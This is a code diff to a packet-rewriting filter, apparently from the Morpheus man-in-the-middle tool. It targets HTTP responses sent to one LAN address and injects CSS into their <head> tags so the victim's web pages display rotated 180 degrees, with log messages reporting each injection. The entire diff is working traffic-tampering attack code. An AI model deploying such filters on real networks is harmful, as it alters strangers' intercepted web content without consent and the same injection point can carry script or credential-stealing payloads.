@@ -33,10 +33,15 @@ if (ip.proto == TCP && tcp.src == 80) {
 #####################
 ## Replace Content ##
 #####################
-if (ip.proto == TCP && tcp.dst == 80) {
+if (ip.dst == '192.168.1.69' && ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "<head>")) {
-    replace("<head>", "<head><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>");
-    msg("[Morpheus] rotate document 180 degrees...\n");
+    msg("[morpheus] | status: <head> tag found in target request...");
+    msg("[morpheus] |  info : injecting css code into <head> tag ✔");
+    msg("[morpheus] |_ info : rotating webpage document in 180 degrees ✔\n");
+
+      # inject our css code into packet captured head tag...
+      replace("<head>", "<head><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>");
+      replace("<HEAD>", "<HEAD><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>");
   }
 }
 
